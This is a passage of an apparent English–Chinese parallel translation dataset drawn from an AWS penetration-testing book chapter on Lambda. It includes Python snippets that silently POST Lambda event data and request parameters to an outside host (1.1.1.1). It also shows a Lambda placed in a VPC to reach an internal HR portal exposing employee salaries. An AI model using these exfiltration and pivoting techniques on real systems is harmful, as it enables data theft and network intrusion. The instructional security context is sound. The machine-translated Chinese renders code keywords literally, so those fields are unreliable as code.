- en: '[PRE25]'
  id: totrans-165
  prefs: []
  type: TYPE_PRE
  zh: '[PRE25]'
- en: 'try:'
  id: totrans-166
  prefs: []
  type: TYPE_NORMAL
  zh: 尝试：
- en: from botocore.vendored import requests
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: 从botocore.vendored导入请求
- en: requests.post('http://1.1.1.1', json=event, timeout=0.01)
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: requests.post（'http://1.1.1.1'，json = event，timeout = 0.01）
- en: 'except:'
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: 除外：
- en: pass
  id: totrans-170
  prefs: []
  type: TYPE_NORMAL
  zh: 通过
- en: '[PRE26]'
  id: totrans-171
  prefs: []
  type: TYPE_PRE
  zh: '[PRE26]'
- en: 'try:'
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: 尝试：
- en: 'data = {''url'': url, ''params'': params, **kwargs}'
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 数据= {'url'：url，'params'：params，** kwargs}
- en: request('POST', 'http://1.1.1.1', json=data, timeout=0.01)
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: 请求（'POST'，'http://1.1.1.1'，json = data，timeout = 0.01）
- en: 'except:'
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: 除外：
- en: pass
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: 通过
- en: '[PRE27]'
  id: totrans-177
  prefs: []
  type: TYPE_PRE
  zh: '[PRE27]'
- en: aws ec2 describe-instances
  id: totrans-178
  prefs: []
  type: TYPE_NORMAL
  zh: aws ec2 describe-instances
- en: '[PRE28]'
  id: totrans-179
  prefs: []
  type: TYPE_PRE
  zh: '[PRE28]'
- en: 'try:'
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: 尝试：
- en: from botocore.vendored import requests
  id: totrans-181
  prefs: []
  type: TYPE_NORMAL
  zh: 从botocore.vendored导入请求
- en: req = requests.get('http://172.31.32.192/')
  id: totrans-182
  prefs: []
  type: TYPE_NORMAL
  zh: req = requests.get（'http://172.31.32.192 /'）
- en: print(req.text)
  id: totrans-183
  prefs: []
  type: TYPE_NORMAL
  zh: 打印（req.text）
- en: 'except:'
  id: totrans-184
  prefs: []
  type: TYPE_NORMAL
  zh: 除外：
- en: pass
  id: totrans-185
  prefs: []
  type: TYPE_NORMAL
  zh: 通过
- en: '```'
  id: totrans-186
  prefs: []
  type: TYPE_NORMAL
  zh: '```'
- en: To keep it simple, we'll just be printing the output to the console and viewing
    it there, but this is another situation where some sort of exfiltration may be
    necessary. Ensure that your Lambda function has internet access, though, as they
    lose default internet access when launched into a VPC and rely on the VPC to provide
    that access.
  id: totrans-187
  prefs: []
  type: TYPE_NORMAL
  zh: 为了简单起见，我们将只将输出打印到控制台并在那里查看，但这是另一种可能需要某种外泄的情况。但是，请确保您的Lambda函数具有Internet访问权限，因为当它们被启动到VPC中时，它们会失去默认的Internet访问权限，并依赖于VPC来提供该访问权限。
- en: 'After running the payload to try to make an HTTP request to that internal IP,
    we are shown the following in the Lambda console:'
  id: totrans-188
  prefs: []
  type: TYPE_NORMAL
  zh: 在运行有效负载以尝试向该内部IP发出HTTP请求后，我们在Lambda控制台中看到了以下内容：
- en: '![](img/c8ed9d36-5578-42ed-8b50-ce50c7e375a8.png)'
  id: totrans-189
  prefs: []
  type: TYPE_IMG
  zh: ！[]（img / c8ed9d36-5578-42ed-8b50-ce50c7e375a8.png）
- en: We contacted the internal server and received a response
  id: totrans-190
  prefs: []
  type: TYPE_NORMAL
  zh: 我们联系了内部服务器并收到了回应
- en: Just like that, we can see that we gained access to the internal network to
    bypass network restrictions and accessed some sort of internal human resources
    portal for the company we are targeting. At the bottom, we can even see a table
    with some private employee information, such as their salary.
  id: totrans-191
  prefs: []
  type: TYPE_NORMAL
  zh: 就这样，我们可以看到，我们已经访问了内部网络，以绕过网络限制，并访问了我们正在攻击的公司的某种内部人力资源门户。在底部，我们甚至可以看到一张包含一些私人员工信息的表，例如他们的薪水。
- en: It's that easy to gain access to the internal side of a network in AWS. This
    method can be used for a variety of different attacks, such as accessing an RDS
    database that is not publicly accessible, because we can just launch a Lambda
    function into the VPC/subnet that it resides in and make a connection to it. All
    kinds of AWS services have the option to launch a resource into a private VPC
    to disable public access to it, and this method of getting into the internal side
    of a VPC allows us to access all these different services; a few other examples
    include `ElastiCache` databases, EKS clusters, and more.
  id: totrans-192
  prefs: []
  type: TYPE_NORMAL
  zh: 这样就可以轻松地访问AWS网络的内部侧。这种方法可以用于各种不同的攻击，例如访问不公开可访问的RDS数据库，因为我们可以将Lambda函数启动到其所在的VPC
    /子网中并与其进行连接。各种AWS服务都有将资源启动到私有VPC以禁用对其的公共访问的选项，而这种进入VPC内部的方法使我们能够访问所有这些不同的服务；其他一些示例包括`ElastiCache`数据库，EKS集群等。
- en: Summary
  id: totrans-193
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 摘要
- en: AWS Lambda is an extremely versatile and useful service for both AWS users and
    attackers alike. There are many possibilities for we can use Lambda to our benefit
    as attackers, and one of the best things is that our target doesn't even necessarily
    need to be using Lambda themselves for it to benefit us.
  id: totrans-194
  prefs: []
  type: TYPE_NORMAL
  zh: AWS Lambda是一项非常多才多艺且有用的服务，既适用于AWS用户，也适用于攻击者。作为攻击者，我们可以利用Lambda的许多可能性，其中最好的一点是，我们的目标甚至不一定需要自己使用Lambda，也可以使我们受益。
- en: Due to the many different use cases for Lambda, it is always one of the more
    high-priority services to check out, as it can often yield very fruitful attack
    paths to allow us to gain further access to an AWS environment. Another thing
    to keep in mind is that with many services, including Lambda, they are constantly
    evolving, opening and closing different attack paths that we can make use of;
    it is important to stay up to date and knowledgeable, because the accounts we
    are attacking will be making use of those changes, as well.
  id: totrans-195
  prefs: []
  type: TYPE_NORMAL
  zh: 由于Lambda有许多不同的用例，它总是我们要检查的更高优先级服务之一，因为它通常会产生非常有益的攻击路径，使我们能够进一步访问AWS环境。还要记住的一件事是，与许多服务（包括Lambda）一样，它们不断发展，打开和关闭不同的攻击路径，我们可以利用；保持最新和知识渊博非常重要，因为我们正在攻击的帐户将利用这些变化。
